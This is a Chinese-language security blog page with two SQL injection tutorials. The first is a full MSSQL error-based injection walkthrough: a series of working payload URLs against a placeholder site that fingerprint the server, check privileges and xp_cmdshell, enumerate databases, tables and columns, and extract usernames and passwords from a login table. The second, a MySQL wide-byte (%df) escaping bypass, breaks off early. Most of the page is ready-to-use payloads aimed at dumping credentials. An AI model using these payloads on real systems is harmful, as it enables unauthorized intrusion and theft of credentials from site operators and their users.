<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">


  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=">


  <link rel="mask-icon" href="/images/logo.svg?v=" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Evil-404" type="application/atom+xml" />






<meta name="description" content="别惹我,我疯起来连自己都黑！">
<meta name="keywords" content="Evil-404,evil404,apt攻防">
<meta property="og:type" content="website">
<meta property="og:title" content="Evil-404">
<meta property="og:url" content="https://evil-404.github.io/page/14/index.html">
<meta property="og:site_name" content="Evil-404">
<meta property="og:description" content="别惹我,我疯起来连自己都黑！">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Evil-404">
<meta name="twitter:description" content="别惹我,我疯起来连自己都黑！">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: 'LPBE9XRFRL',
      apiKey: '246a90c6ff16be5d5708e201cf6d7158',
      indexName: 'hexo',
      hits: {"per_page":10},
      labels: {"input_placeholder":"输入关键字搜索","hits_empty":"“没有找到与 ${query} 相关的内容”","hits_stats":"“搜索到 ${hits} 条相关记录，共耗时 ${time} ms”"}
    }
  };
</script>



  <link rel="canonical" href="https://evil-404.github.io/page/14/"/>





  <title>Evil-404</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Evil-404</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">专注于 APT 攻防研究,致力于高质量实用干货分享</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  
  <div class="algolia-popup popup search-popup">
    <div class="algolia-search">
      <div class="algolia-search-input-icon">
        <i class="fa fa-search"></i>
      </div>
      <div class="algolia-search-input" id="algolia-search-input"></div>
    </div>

    <div class="algolia-results">
      <div id="algolia-stats"></div>
      <div id="algolia-hits"></div>
      <div id="algolia-pagination" class="algolia-pagination"></div>
    </div>

    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
  </div>




    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/mssql-error-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mssql-error-injection.html" itemprop="url">sql注入入门 之 mssql常规显错注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-17T04:16:42+08:00">
                2016-05-17
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:57:55+08:00">
                2017-06-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,870
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,mssql常规显错型,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection1.png" alt="&#39;&#39;"><br></p>
<p>2,依旧先尝试经典的单引号,数据库如期报错,报错原因的很清楚,参数后面多了单引号,不过这也恰好说明我们的单引号已被带入正常查询,其实,到此为止,根据以往的经验我们也可以判断这里百分之九十是个mssql注入点,因为这很显然不是其他数据库的报错信息嘛<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection2.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>  条件为真,页面返回正常</span><br></pre></td></tr></table></figure>
<p><img src="/img/mssql_error_injection3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为真,页面返回异常,典型的数字型注入</span><br></pre></td></tr></table></figure>
<p><img src="/img/mssql_error_injection4.png" alt="&#39;&#39;"><br></p>
<p>3,我们可以用下面的语句进一步确实目标是否真的为mssql数据库,页面返回正常则是,返回异常则不是,根据返回,没跑了,这确实是个正儿八经的mssql数据库,’sysobjects’是mssql的系统表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> exists(select * from sysobjects)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection5.png" alt="&#39;&#39;"><br></p>
<p>4,好吧,没说的,开始写注入语句,获取当前mssql版本,可知当前数据库版本为 2008R2<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select @@VERSION))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection6.png" alt="&#39;&#39;"><br></p>
<p>5,获取目标机器的机器名,看机器名主要是因为有时候我们想从机器名上得知这个机器大概是干嘛的,有没有可能在内网,都可以通过这个来初步判断下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  @@servername))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection7.png" alt="&#39;&#39;"><br></p>
<p>6,获取当前的数据库用户名,当前数据库用户名为 ‘easysofts_kiran’,非sa,关于sa权限下的注入利用方式,后续还会有单独说明,今天的重点还是显错注入,所以为了防止跑题,这里就不多说了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select suser_sname()))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection8.png" alt="&#39;&#39;"><br></p>
<p>7,看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=(select count(*) from master..sysobjects where xtype = <span class="string">'x'</span> <span class="keyword">and</span> name = <span class="string">'xp_cmdshell'</span>) --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection9.png" alt="&#39;&#39;"><br></p>
<p>8,看下当前角色是否为数据库管理员,返回如下报错,很显然,并不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(SELECT is_srvrolemember(<span class="string">'sysadmin'</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection10.png" alt="&#39;&#39;"><br></p>
<p>9,再看下当前角色是否为db_ownwer,我们很清楚,在这样的权限下我们可以通过各种备份方式往目标的网站目录里写文件(webshell),很显然,也不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  IS_MEMBER(<span class="string">'db_owner'</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection11.png" alt="&#39;&#39;"><br></p>
<p>10,根据上面得到的这些信息,我们发现,这就是个再正常不过的显错mssql数字型注入点,好吧,既然如此,那就按照常规查数据的方式一步步的慢慢来吧<br>首先,获取当前数据库名,如下可知当前数据库名为 ‘easysofts’,db_name()在不带任何参数时表示显示当前数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name()))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection12.png" alt="&#39;&#39;"><br></p>
<p>如下表示第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">1</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection13.png" alt="&#39;&#39;"><br></p>
<p>如下表示第六个数据库名,像这样重复性的动作,我们依然是可以交给burpsuite来完成<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">5</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection14.png" alt="&#39;&#39;"><br></p>
<p>当然,在此之前你还可以先统计下总共有多少个库,这样,我们在burpsuite中设置payload的时候就可以更精确点了,节省时间,不过,如果你直接使用下面的语句可能会报错<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)+(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )+CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection27.png" alt="&#39;&#39;"><br></p>
<p>把里面的’+’换成%2b即可解决问题,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection25.png" alt="&#39;&#39;"><br></p>
<p>11,获取当前数据库中的所有表名<br>如下表示获取当前库的第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection15.png" alt="&#39;&#39;"><br></p>
<p>通过not in条件,把每次查出来的表名都加进去,这样就可以慢慢把所有的表都遍历出来,如下表示获取第二张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection16.png" alt="&#39;&#39;"><br></p>
<p>获取第三张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection17.png" alt="&#39;&#39;"><br></p>
<p>获取第四张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection18.png" alt="&#39;&#39;"><br></p>
<p>利用上面的方法,循环往复,直到报错为止,最后得到所有的表名如下,很显然,’login’就是我们想要的管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>,<span class="string">'footer'</span>,<span class="string">'feedback'</span>,<span class="string">'header'</span>,<span class="string">'slider'</span>,<span class="string">'services'</span>,<span class="string">'product'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection19.png" alt="&#39;&#39;"><br></p>
<p>当然,你也可以像前面一样,事先统计下当前库中表的总个数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span>  AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM information_schema.TABLES )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection28.png" alt="&#39;&#39;"><br></p>
<p>12,接着,获取’login’表中的所有字段名,获取的方式同上,利用not in依次遍历出所有的字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> column_name from information_schema.columns where table_name=<span class="string">'login'</span> ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection20.png" alt="&#39;&#39;"><br></p>
<p>最后,获取的所有字段,名如下<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://vuln.com/Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="built_in">convert</span>(int,(select top <span class="number">1</span> column_name <span class="built_in">from</span> information_schema.columns where table_name=<span class="string">'login'</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'login_id'</span>,<span class="string">'username'</span>,<span class="string">'password'</span>,<span class="string">'name'</span>)  ))<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection21.png" alt="&#39;&#39;"><br></p>
<p>13,有了表名,字段名接下来的事情就很好办了,直接去查出对应字段下的数据即可<br>获取username字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> username from login ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection22.png" alt="&#39;&#39;"><br></p>
<p>获取password字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> password from login ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection23.png" alt="&#39;&#39;"><br></p>
<p>统计login中有多少条记录<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM login)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection26.png" alt="&#39;&#39;"><br></p>
<p>假设你在当前库中并没有看到管理表,这时不妨尝试跨库查,前提是你要有权限才行,如下就表示没权限,如果是这样你就要好好想想别的办法了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM (SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM riseyour_availbgur.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection24.png" alt="&#39;&#39;"><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mssql的注入语句,大家也看到了,跟mysql也差不了多少,都是从information_scheam库中获取各种数据,不过,核心还是利用convert()函数的高级显错特性,多练习多总结即可,里面暂时也没什么特别多的技术含量,比mysql好的地方就是它可能支持堆查询,这样在写注入语句的时候就很方便了,在此只是为了让大家看的更完整一些,所以写的相对比较细,在实际渗透中,怎么简洁,怎么快,怎么方便,怎么搞,完全不用刻意去按照我们的流程来,举一反三,灵活变通才是关键当然,mssql本身还有很多高级特性,但,这不是一两篇文章就能说的清楚的,来日方长,慢慢积累吧……<br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/mysql-wide-byte-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mysql-wide-byte-injection.html" itemprop="url">sql注入入门 之 mysql宽字节注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-16T02:06:41+08:00">
                2016-05-16
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-04-24T21:56:55+08:00">
                2017-04-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  859
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,如下,宽字节注入的原型实例代码,注意连接字符集为gbk,对传入的值已用addslashes()做了转义,另外,php是把id当做一个字符串来接收的,后面在闭合的时候需要注意下,具体如下:<br><img src="/img/wide_type_1.png" alt="&#39;&#39;"><br></p>
<p>2,本此用于测试的 宽字节注入点,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_2.png" alt="&#39;&#39;"><br></p>
<p>3,这时当我们用经典的单引号尝试对传入参数进行干扰时发现,貌似并没有任何反应,原因很明显,因为addslashes()已经把我们提交的单引号给转义了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_3.png" alt="&#39;&#39;"><br></p>
<p>4,现在,我们就可以尝试利用宽字符来突破类似的转义问题,这里使用经典的%df宽字符,如下,页面返回数据库报错,说明我们的单引号已经被带入正常的sql语句中执行查询了,也就是说,用于转义的那个’\’已经罢工了<br><img src="/img/wide_type_4.png" alt="&#39;&#39;"><br></p>
